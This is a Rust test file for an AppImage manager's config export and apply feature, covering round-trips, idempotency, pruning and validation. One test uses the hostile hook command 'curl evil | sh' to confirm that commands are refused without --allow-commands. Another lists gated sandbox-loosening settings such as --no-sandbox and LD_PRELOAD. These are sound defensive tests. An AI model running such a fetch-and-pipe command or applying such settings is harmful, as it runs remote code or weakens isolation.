use super::*;
use crate::fixture;
use crate::http::fake::FakeHttp;
use crate::paths::Dirs;
use sha2::{Digest, Sha256};
use std::fs;

fn lib() -> (tempfile::TempDir, Library) {
    let tmp = tempfile::tempdir().unwrap();
    let lib = Library::open(Dirs::with_root(tmp.path()), tmp.path().join("appofholding")).unwrap();
    (tmp, lib)
}

fn set_up(tmp: &std::path::Path, lib: &Library) {
    let p = tmp.join("Foo.AppImage");
    fs::write(
        &p,
        fixture::simple_appimage(
            "Foo App",
            Some("gh-releases-zsync|o|foo|latest|Foo-*-x86_64.AppImage.zsync"),
        ),
    )
    .unwrap();
    lib.add(&p, &AddOptions::default()).unwrap();
    lib.set_policy("foo-app", Policy::Auto).unwrap();
    lib.set_sandbox(
        "foo-app",
        &Settings {
            network: false,
            paths: vec![PathGrant {
                path: "/tmp".into(),
                write: true,
            }],
            ..Settings::for_level(Level::Standard)
        },
    )
    .unwrap();
    let mut p = Profile::default();
    p.args = vec!["--flag".into(), "a b".into()];
    p.presets = vec!["x11".into()];
    p.env.insert("K".into(), "v".into());
    lib.set_profile("foo-app", "default", &p).unwrap();
    lib.set_profile(
        "foo-app",
        "debug",
        &Profile {
            presets: vec!["debug".into()],
            ..Profile::default()
        },
    )
    .unwrap();
    lib.set_hook("foo-app", "post-update", "echo done").unwrap();
}

#[test]
fn commands_in_a_file_are_refused_unless_allowed() {
    let tmp = tempfile::tempdir().unwrap();
    let lib = Library::open(Dirs::with_root(tmp.path()), tmp.path().join("appofholding")).unwrap();
    let p = tmp.path().join("Foo.AppImage");
    std::fs::write(&p, fixture::simple_appimage("Foo App", None)).unwrap();
    lib.add(&p, &crate::library::AddOptions::default()).unwrap();
    let cfg = Config::parse(
        "version = 1\n[[app]]\nid = \"foo-app\"\n[app.hooks]\npost-update = \"curl evil | sh\"\n",
    )
    .unwrap();
    let notes = lib.apply_config(&FakeHttp::default(), &cfg, &ApplyOptions::default());
    assert!(
        matches!(&notes[..], [Note::Failed { error, .. }] if error.contains("--allow-commands") && error.contains("curl evil")),
        "{notes:?}"
    );
    assert!(
        lib.hooks("foo-app").unwrap().is_empty(),
        "nothing was written"
    );

    // A typo in a hook name is caught before anything is changed.
    let bad = Config::parse(
            "version = 1\n[[app]]\nid = \"foo-app\"\npolicy = \"manual\"\n[app.hooks]\npost-updat = \"true\"\n",
        )
        .unwrap();
    let opts = ApplyOptions {
        allow_commands: true,
        ..Default::default()
    };
    let notes = lib.apply_config(&FakeHttp::default(), &bad, &opts);
    assert!(matches!(&notes[..], [Note::Failed { .. }]), "{notes:?}");

    let notes = lib.apply_config(&FakeHttp::default(), &cfg, &opts);
    assert!(matches!(&notes[..], [Note::Configured(_)]), "{notes:?}");
    assert_eq!(lib.hooks("foo-app").unwrap().len(), 1);
}

#[test]
fn every_kind_of_source_survives_export_and_apply() {
    let providers = [
        Provider::GitHub {
            owner: "o".into(),
            repo: "r".into(),
        },
        Provider::GitLab {
            host: "gitlab.com".into(),
            project: "g/p".into(),
        },
        Provider::GitLab {
            host: "invent.kde.org".into(),
            project: "g/p".into(),
        },
        Provider::Forgejo {
            host: "codeberg.org".into(),
            owner: "o".into(),
            repo: "r".into(),
        },
        Provider::Url {
            url: "https://www.vendor.com/dl?os=linux".into(),
        },
        Provider::Zsync {
            url: "https://x.org/Foo.AppImage.zsync".into(),
        },
    ];
    for p in providers {
        let back = crate::source::parse_input(&source_to_input(&p)).unwrap();
        assert_eq!(back.source.provider, p);
    }
}

#[test]
fn export_is_portable_readable_and_round_trips_through_toml() {
    let (tmp, lib) = lib();
    set_up(tmp.path(), &lib);
    let cfg = lib.export_config().unwrap();
    let text = cfg.to_toml().unwrap();
    assert!(
        !text.contains(&tmp.path().display().to_string()),
        "no machine-specific paths: {text}"
    );
    assert!(
        text.contains("source = \"https://github.com/o/foo\"")
            && text.contains("policy = \"auto\""),
        "{text}"
    );
    // The sandbox is a preset plus only what differs from it.
    assert!(
        text.contains("level = \"standard\"")
            && text.contains("network = false")
            && !text.contains("gpu"),
        "{text}"
    );
    assert!(text.contains("allow = [\"/tmp:rw\"]"), "{text}");
    assert_eq!(Config::parse(&text).unwrap(), cfg);
}

#[test]
fn apply_reproduces_an_exported_setup_on_a_fresh_library_and_is_idempotent() {
    let (tmp, lib) = lib();
    set_up(tmp.path(), &lib);
    let text = lib.export_config().unwrap().to_toml().unwrap();

    // A "new machine": the app is not there; the source says where to get it.
    let (_tmp2, fresh) = self::lib();
    let img = fixture::simple_appimage(
        "Foo App",
        Some("gh-releases-zsync|o|foo|latest|Foo-*-x86_64.AppImage.zsync"),
    );
    let sha = hex::encode(Sha256::digest(&img));
    let rel = format!(
        r#"{{"tag_name":"v1.2.3","prerelease":false,"draft":false,"assets":[{{"name":"Foo-1.2.3-x86_64.AppImage","browser_download_url":"https://dl/foo","size":{},"digest":"sha256:{sha}"}}]}}"#,
        img.len()
    );
    let http = FakeHttp::default()
        .json("https://api.github.com/repos/o/foo/releases/latest", &rel)
        .bytes("https://dl/foo", img);
    let cfg = Config::parse(&text).unwrap();
    let notes = fresh.apply_config(
        &http,
        &cfg,
        &ApplyOptions {
            allow_commands: true,
            ..Default::default()
        },
    );
    assert_eq!(
        notes,
        vec![
            Note::Installed("foo-app".into()),
            Note::Configured("foo-app".into())
        ]
    );

    // Everything came across.
    let again = fresh.export_config().unwrap();
    let strip = |mut c: Config| {
        for a in &mut c.apps {
            a.name = None;
        }
        c
    };
    assert_eq!(strip(again.clone()), strip(cfg.clone()));
    assert_eq!(
        fresh.sandbox_settings("foo-app").unwrap().level,
        Level::Custom
    );

    // Applying again changes nothing and downloads nothing.
    let before = http.requests.lock().unwrap().len();
    let notes = fresh.apply_config(
        &http,
        &cfg,
        &ApplyOptions {
            allow_commands: true,
            ..Default::default()
        },
    );
    assert_eq!(notes, vec![Note::Configured("foo-app".into())]);
    assert_eq!(http.requests.lock().unwrap().len(), before);
    assert_eq!(fresh.export_config().unwrap(), again);
}

#[test]
fn missing_apps_without_a_way_to_get_them_are_reported_not_fatal() {
    let (_t, lib) = lib();
    let cfg = Config::parse(
        "version = 1\n[[app]]\nid = \"ghost\"\n[[app]]\nid = \"other\"\nsource = \"o/r\"\n",
    )
    .unwrap();
    let notes = lib.apply_config(
        &FakeHttp::default(),
        &cfg,
        &ApplyOptions {
            no_install: true,
            allow_commands: true,
            ..Default::default()
        },
    );
    assert!(
        matches!(&notes[0], Note::Missing { id, reason } if id == "ghost" && reason.contains("neither")),
        "{notes:?}"
    );
    assert!(
        matches!(&notes[1], Note::Missing { reason, .. } if reason.contains("downloads are turned off")),
        "{notes:?}"
    );
    // A download failure is a Failed note for that app only.
    let notes = lib.apply_config(
        &FakeHttp::default(),
        &cfg,
        &ApplyOptions {
            allow_commands: true,
            ..Default::default()
        },
    );
    assert!(
        matches!(&notes[1], Note::Failed { id, .. } if id == "other"),
        "{notes:?}"
    );
}

#[test]
fn typos_and_bad_values_are_rejected_before_anything_changes() {
    let (tmp, lib) = lib();
    set_up(tmp.path(), &lib);
    assert!(
        Config::parse("version = 2\n")
            .unwrap_err()
            .to_string()
            .contains("not supported")
    );
    assert!(
        Config::parse("version = 1\n[[app]]\nid = \"a\"\npolcy = \"auto\"\n")
            .unwrap_err()
            .to_string()
            .contains("polcy")
    );
    assert!(
        Config::parse("version = 1\n[[app]]\nid = \"a\"\n[[app]]\nid = \"a\"\n")
            .unwrap_err()
            .to_string()
            .contains("twice")
    );

    let cfg = Config::parse(
            "version = 1\n[[app]]\nid = \"foo-app\"\npolicy = \"pinned\"\n[app.sandbox]\nlevel = \"paranoid\"\n",
        )
        .unwrap();
    let notes = lib.apply_config(
        &FakeHttp::default(),
        &cfg,
        &ApplyOptions {
            allow_commands: true,
            ..Default::default()
        },
    );
    assert!(
        matches!(&notes[0], Note::Failed { error, .. } if error.contains("paranoid")),
        "{notes:?}"
    );
    assert_eq!(
        lib.source("foo-app").unwrap().unwrap().policy,
        Policy::Auto,
        "the valid-looking policy was not applied either"
    );
}

#[test]
fn prune_removes_what_the_file_does_not_list() {
    let (tmp, lib) = lib();
    set_up(tmp.path(), &lib);
    let cfg = Config::parse(
        "version = 1\n[[app]]\nid = \"foo-app\"\n[[app.profile]]\nname = \"default\"\n",
    )
    .unwrap();
    // Without --prune, extras stay.
    lib.apply_config(
        &FakeHttp::default(),
        &cfg,
        &ApplyOptions {
            allow_commands: true,
            ..Default::default()
        },
    );
    assert_eq!(lib.profiles("foo-app").unwrap().len(), 2);
    assert_eq!(lib.hooks("foo-app").unwrap().len(), 1);
    assert!(lib.sandbox_settings("foo-app").unwrap().enabled());
    lib.apply_config(
        &FakeHttp::default(),
        &cfg,
        &ApplyOptions {
            prune: true,
            allow_commands: true,
            ..Default::default()
        },
    );
    assert_eq!(lib.profiles("foo-app").unwrap().len(), 1);
    assert!(lib.hooks("foo-app").unwrap().is_empty());
    assert!(!lib.sandbox_settings("foo-app").unwrap().enabled());
}

#[test]
fn local_files_can_be_added() {
    let (tmp, lib) = lib();
    let f = tmp.path().join("Bar.AppImage");
    fs::write(&f, fixture::simple_appimage("Bar", None)).unwrap();
    let text = format!(
        "version = 1\n[[app]]\nid = \"bar\"\nfile = \"{}\"\npolicy = \"manual\"\n",
        f.display()
    );
    let notes = lib.apply_config(
        &FakeHttp::default(),
        &Config::parse(&text).unwrap(),
        &ApplyOptions {
            allow_commands: true,
            ..Default::default()
        },
    );
    assert_eq!(notes[0], Note::Added("bar".into()));
    assert_eq!(lib.get("bar").unwrap().id, "bar");
}

#[test]
fn anything_that_loosens_the_sandbox_or_reaches_the_app_needs_allow_commands() {
    let gated = [
        (
            "[[app.profile]]\nname = \"default\"\nargs = [\"--no-sandbox\"]\n",
            "--no-sandbox",
        ),
        (
            "[[app.profile]]\nname = \"default\"\nenv = { LD_PRELOAD = \"/x.so\" }\n",
            "LD_PRELOAD=/x.so",
        ),
        ("[app.sandbox]\nlevel = \"none\"\n", "sandbox turned off"),
        (
            "[app.sandbox]\nlevel = \"standard\"\nbus = \"full\"\n",
            "session bus",
        ),
        (
            "[app.sandbox]\nlevel = \"strict\"\nhome = \"rw\"\n",
            "home folder",
        ),
        (
            "[app.sandbox]\nlevel = \"strict\"\nallow = [\"/srv/data\"]\n",
            "/srv/data",
        ),
    ];
    for (body, expect) in gated {
        let cfg = Config::parse(&format!("version = 1\n[[app]]\nid = \"x\"\n{body}")).unwrap();
        let found = commands_in(&cfg.apps[0]).join("; ");
        assert!(found.contains(expect), "{body}: {found}");
    }
    // Tightening is never gated.
    let cfg = Config::parse(
        "version = 1\n[[app]]\nid = \"x\"\n[app.sandbox]\nlevel = \"strict\"\nnetwork = false\nbus = \"off\"\nhome = \"private\"\n",
    )
    .unwrap();
    assert!(commands_in(&cfg.apps[0]).is_empty());

    // Applying refuses it and changes nothing.
    let (tmp, lib) = lib();
    set_up(tmp.path(), &lib);
    let before = lib.sandbox_settings("foo-app").unwrap();
    let cfg = Config::parse(
        "version = 1\n[[app]]\nid = \"foo-app\"\n[app.sandbox]\nlevel = \"standard\"\nbus = \"full\"\n",
    )
    .unwrap();
    let notes = lib.apply_config(&FakeHttp::default(), &cfg, &ApplyOptions::default());
    assert!(
        matches!(&notes[..], [Note::Failed { error, .. }] if error.contains("--allow-commands")),
        "{notes:?}"
    );
    assert_eq!(lib.sandbox_settings("foo-app").unwrap(), before);

    // So does pruning away the [sandbox] section of a sandboxed app.
    assert!(before.enabled());
    let cfg = Config::parse("version = 1\n[[app]]\nid = \"foo-app\"\n").unwrap();
    let prune = ApplyOptions {
        prune: true,
        ..Default::default()
    };
    let notes = lib.apply_config(&FakeHttp::default(), &cfg, &prune);
    assert!(
        matches!(&notes[..], [Note::Failed { error, .. }] if error.contains("sandbox turned off")),
        "{notes:?}"
    );
    assert!(lib.sandbox_settings("foo-app").unwrap().enabled());
}

#[test]
fn ids_must_be_slugs() {
    let err = Config::parse("version = 1\n[[app]]\nid = \"Scale Tail\"\n")
        .unwrap_err()
        .to_string();
    assert!(err.contains("id = \"scale-tail\""), "{err}");
    assert!(Config::parse("version = 1\n[[app]]\nid = \"scale-tail-2\"\n").is_ok());
}
